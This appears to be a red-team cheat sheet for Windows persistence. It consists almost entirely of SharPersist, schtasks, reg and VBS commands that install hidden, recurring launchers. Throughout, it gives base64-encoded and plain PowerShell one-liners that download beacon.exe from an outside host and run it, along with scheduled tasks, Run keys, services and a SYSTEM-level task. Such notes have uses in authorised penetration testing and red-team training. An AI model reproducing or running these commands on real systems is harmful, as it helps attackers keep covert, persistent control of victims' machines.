### SharPersist
https://github.com/mandiant/SharPersist

### Powershell Encoding & Decoding
```powershell
$code = ' $wc = New-Object System.Net.WebClient; $wc.DownloadFile("http://192.168.80.100/beacon.exe", "C:\users\public\beacon.exe"); Start-Process -FilePath "C:\users\public\beacon.exe"; '
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))

$Encoded="IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))

```

### Task Scheduler
```powershell
execute-assembly /root/SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -n "Name" -m add -o hourly
execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m list
execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m remove
```

### Startup Folder
```powershell
execute-assembly /root/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -f "Name" -m add
execute-assembly /root/SharPersist.exe -t startupfolder -m list
execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
```

### Registry AutoRun
Requires admin access for "hklmrun", also there is a length limit on the key value.
```powershell
execute-assembly /root/SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-w hidden -c \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://192.168.80.100/beacon.exe','C:\windows\temp\beacon.exe'); Start-Process -f 'C:\windows\temp\beacon.exe'\"" -k "hkcurun" -v "Name" -m add
execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -v "Name" -m remove
execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -m list
```

### Windows Service (Admin Access)
```powershell
execute-assembly /root/SharPersist.exe -t service -c "C:\Windows\System32\beacon-svc.exe" -n "Name" -m add
execute-assembly /root/SharPersist.exe -t service -n "Name" -m list
execute-assembly /root/SharPersist.exe -t service -n "Name" -m remove
```

### Task Scheduler (schtasks)
There is a length limit on the tr value in the schtasks tool, also the single quote doesn't exist.
```powershell
shell schtasks /create /sc hourly /mo 1 /tn evil /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c \"Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe\" "
shell schtasks /create /sc onlogon /tn evil /tr "calc.exe" /ru SYSTEM
shell schtasks /query /tn evil /V /FO LIST
shell schtasks /run /tn evil
shell schtasks /delete /tn evil
```

### Registry AutoRun (reg)
Requires admin access for "HKLM", also there is a length limit on the key value.
```powershell
shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://192.168.80.100/beacon.exe','C:\windows\temp\beacon.exe'); Start-Process C:\windows\temp\beacon.exe\" "
shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil
```

### Hide PowerShell Commands (VBS)
```powershell
echo Dim shell, command > C:\windows\temp\beacon.vbs
echo command = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -c ""Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -OutFile C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe"" " >> C:\windows\temp\beacon.vbs
echo Set shell = CreateObject("WScript.Shell") >> C:\windows\temp\beacon.vbs
echo shell.Run command, 0 >> C:\windows\temp\beacon.vbs

schtasks /create /sc hourly /mo 1 /tn cool /tr "C:\windows\temp\beacon.vbs"
```
